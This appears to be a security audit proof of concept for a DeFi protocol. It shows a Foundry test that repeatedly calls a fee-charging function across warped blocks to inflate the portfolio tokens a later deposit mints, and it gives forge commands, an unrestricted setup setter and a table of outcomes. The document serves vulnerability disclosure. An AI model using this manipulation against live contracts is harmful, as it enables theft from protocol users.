## Requirement
**My setup doens't deploy via proxy, so a circular dependecy arose between feeModule.sol and portfolio.sol**

- therefore, i added this function to FeeModule.sol
```sol
function ChangePortfolioAddress(address _portfolio) public {
   portfolio = IPortfolio(_portfolio);
}
```
- And OfCourse this line:
```
import {IPortfolio} from  "src/contracts/core/interfaces/IPortfolio.sol";
```

**`Now, All You have to do is to this:`**
- build dependencies quickly by running `forge build` , it would take 3 seconds hardly
- place gist in test/ folder such that test/POC.sol file is created, i've already provided a link to a `gist` in issue comments (probably last one)




## The Attack

**`This attack outcomes depends on two things:`**
- the no of blocks, the attack is repeated in
- the timestamp difference between these blocks

**Analyze `_simulateAttacksInDifferentBlocks()`**
```diff
    function _simulateAttacksInDifferentBlocks() internal {
        vm.startPrank(attacker);
+        uint blocks = 20; // no of blocks
        for (uint i = 1; i < blocks; i++) {
+            vm.warp(block.timestamp + 50); //time-diff between blocks
            feeModule._chargeProtocolAndManagementFees();
        }
        vm.stopPrank();
    }
```
In Normal deposit, as per our current configurations, user will get  
- `9500000000000000`

**run this test**
```bash
forge test --contracts test/POC.sol --match-test test_NormalDeposit -vvv
```

**Now we wanna see change in protocol behaviour after it has been attacked:**

**Remember at this point, the alice is depositing after the protocol  has been attacked**


**`Here is table demonstrating different outcomes of increase in user portfolio balance, if he deposits the same amount after the protocol is attacked:`**


| Blocks | t+50             | t+10             | t+1              |
| ------ | ---------------- | ---------------- | ---------------- |
| 20     | 9500029476677719 | 9500005895327870 | 9500000589532575 |
| 200    | 9500308733951601 | 9500061745983933 | 9500006174579890 |
| 2000   | 9503101758218631 | 9500620270603930 | 9500062025233455 |
| 20000  | 9531077202869606 | 9506207323135757 | 9500620549828824 |



**where,**
- `blocks:`  *no of blocks attack is repeated in*
```sol
uint blocks = 20; // no of blocks
```
- `t + n:`  *timestamp difference between the no of blocks attack is repeated in*
```sol
vm.warp(block.timestamp + 50); //time-diff between blocks
```

**Try it yourself by running this test with different configurations**
```bash
forge test --contracts test/POC.sol --match-test test_AfterAttackDeposit -vvv
```

`[+]` **At this point it is clear how much protocol's calculations are affected, due to this attack the protocol can be rigged in lot of unimaginable ways, like you just saw in the table above how much more alice's same deposits yeild**

`[+]` **He should be only getting `9500000000000000` but due to the attack he was able to increase that number from least `9500000589532575` to `9531077202869606` as shown in the table above**

`[+]` **Which is `589532575` to `31077202869606` more tokens**

`[+]` **that means a user can mint more than `31077202869606` portflio tokens if he does the same deposits after the attack**
